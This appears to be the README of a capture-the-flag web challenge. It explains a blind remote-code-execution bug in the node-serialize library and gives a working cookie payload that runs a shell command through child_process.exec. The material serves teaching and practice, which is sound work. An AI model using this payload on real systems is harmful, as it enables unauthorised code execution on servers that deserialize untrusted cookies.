# SOAL WEB KKST 

if u wanna check the solution just move to the `solution` branch.

this challenge is about node-serialize rce (blind rce):

https://opsecx.com/index.php/2017/02/08/exploiting-node-js-deserialization-bug-for-remote-code-execution/

just parse the rce to the cookie :

`{"username":"_$$ND_FUNC$$_function (){require('child_process').exec('ls /', function(error, stdout, stderr) { console.log(stdout) });}()","country":"Idk Probably Somewhere Dumb","city":"Lametown","num":"2"}`

and replace the cookie, then done u got shell